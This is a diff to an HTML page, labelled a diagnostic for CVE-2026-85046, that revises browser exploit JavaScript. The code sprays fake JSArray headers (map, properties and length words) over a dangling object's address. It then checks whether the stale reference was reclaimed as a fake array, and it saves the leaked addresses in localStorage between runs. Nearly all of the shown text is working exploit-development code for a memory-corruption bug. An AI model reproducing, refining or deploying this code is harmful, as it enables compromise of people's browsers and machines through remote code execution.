@@ -1,7 +1,7 @@
 <!doctype html>
 <html>
   <head>
-    <title>CVE-2026-85046 - Windows alternating-reclaim probe v3</title>
+    <title>CVE-2026-85046 - Windows controlled-reclaim diagnostic v6</title>
     <meta charset="UTF-8" />
     <style>
       * {
@@ -178,6 +178,15 @@
 
       var running = false;
 
+      try {
+        var previousDiagnostic = localStorage.getItem("f022-v6-last");
+        if (previousDiagnostic) {
+          setTimeout(function () {
+            log("[previous diagnostic] " + previousDiagnostic);
+          }, 10);
+        }
+      } catch (_) {}
+
       function handleClick() {
         if (running) return;
         running = true;
@@ -299,35 +308,44 @@
       //   phase selects which 4-byte alignment the window starts are placed at
       //   (0 => 0-mod-8, 4 => 4-mod-8) so it always matches the dangling address.
       // ---------------------------------------------------------------------------
-      function spray_fake_arrays(victim_elems_tagged, phase) {
-        var sizes = [0x3fff, 0x3ffb, 0x3fff, 0x3ffb];
+      function makeSprayTemplate(n, victim_elems_tagged, phase) {
+        var t;
 
-        for (var i = 0; i < 4; i++) {
-          var n = sizes[i];
-          var a;
+        if (phase === 0) {
+          var hdr = w2f(PACKED_DOUBLE_MAP, EMPTY_PROPERTIES);
+          var pair = w2f(victim_elems_tagged, FAKE_LEN_SMI);
 
-          if (phase === 0) {
-            var hdr = w2f(PACKED_DOUBLE_MAP, EMPTY_PROPERTIES);
-            var pair = w2f(victim_elems_tagged, FAKE_LEN_SMI);
+          t = new Array(n).fill(hdr);
+          for (var i = 1; i < t.length; i += 2) t[i] = pair;
+        } else {
+          var odd = w2f(EMPTY_PROPERTIES, victim_elems_tagged);
+          var even = w2f(FAKE_LEN_SMI, PACKED_DOUBLE_MAP);
 
-            a = new Array(n).fill(hdr);
-
-            for (var j = 1; j < a.length; j += 2) {
-              a[j] = pair;
-            }
-          } else {
-            var odd = w2f(EMPTY_PROPERTIES, victim_elems_tagged);
-            var even = w2f(FAKE_LEN_SMI, PACKED_DOUBLE_MAP);
-
-            a = new Array(n).fill(odd);
-
-            for (var k = 1; k < a.length; k += 2) {
-              a[k] = even;
-            }
-          }
-
-          // Deliberately don't retain `a`.
+          t = new Array(n).fill(odd);
+          for (var i = 1; i < t.length; i += 2) t[i] = even;
         }
+
+        return t;
+      }
+
+      // Two template sizes keep the allocation geometry from repeatedly landing
+      // on exactly the same boundary.  The templates are built once; the actual
+      // pressure comes from slice() copies, avoiding a throwaway holey backing
+      // allocation for every sprayed window.
+      function sprayControlled(victim_elems_tagged, phase, groups) {
+        var tA = makeSprayTemplate(0x3fff, victim_elems_tagged, phase);
+        var tB = makeSprayTemplate(0x3ffb, victim_elems_tagged, phase);
+        var keep = null;
+
+        // One group is roughly 512 KiB of FixedDoubleArray backing allocation.
+        for (var g = 0; g < groups; g++) {
+          keep = tA.slice();
+          keep = tB.slice();
+          keep = tA.slice();
+          keep = tB.slice();
+        }
+
+        return keep;
       }
 
       // ---------------------------------------------------------------------------
@@ -396,14 +414,24 @@
         // stale address's semispace becomes allocatable and gets sprayed over.
         // 64 rounds x 4 x 128KB = 32MB — enough to flip an 8MB semispace pair
         // and re-cover the dead address even at a deep offset.
-        dbg("      [6.1] spray phase 1...");
-        spray_fake_arrays(victim_elems_tagged, pattern);
+        var sprayGroups = 48; // ~24 MiB; increase only if the dump shows the stale slot was not covered.
+        try {
+          localStorage.setItem(
+            "f022-v6-last",
+            JSON.stringify({
+              dead_addr: hex(dead_addr),
+              victim: hex(victim_base),
+              pattern: pattern,
+              sprayGroups: sprayGroups,
+              expectedMap: hex(PACKED_DOUBLE_MAP),
+              expectedEmptyProperties: hex(EMPTY_PROPERTIES),
+              expectedLengthWord: hex(FAKE_LEN_SMI),
+            }),
+          );
+        } catch (_) {}
 
-        dbg("      [6.2] spray phase 2...");
-        spray_fake_arrays(victim_elems_tagged, pattern);
-
-        dbg("      [6.3] spray phase 3...");
-        spray_fake_arrays(victim_elems_tagged, pattern);
+        dbg("      [6] controlled slice spray: groups=" + sprayGroups + " (~24 MiB)...");
+        var sprayKeep = sprayControlled(victim_elems_tagged, pattern, sprayGroups);
 
         // Debug pause (#auto#pause): spin so gdb can attach to the renderer and
         // dump memory around dead_addr before the deref (crashes invalidate it).
@@ -426,26 +454,13 @@
         if (typeof master !== "object")
           throw new Error("bad[2] is not an object");
 
-        // Critical diagnostic:
-        dbg("      [7.1] attempting JSArray length validation...");
-
+        dbg("      [7.1] attempting fake-JSArray length validation...");
         var len = master.length;
-
-        dbg("      [7.2] master.length=" + len);
-
-        if (len !== 32) {
-          throw new Error(
-            "stale object was not reclaimed as fake JSArray " +
-              "(master.length=" +
-              len +
-              ")",
-          );
-        }
         dbg("      [7.2] master.length=" + len);
 
         if (len !== 32)
           throw new Error(
-            "object was reclaimed/changed, but fake JSArray did not land " +
+            "stale object was not reclaimed as the intended fake JSArray " +
               "(master.length=" +
               len +
               ")",
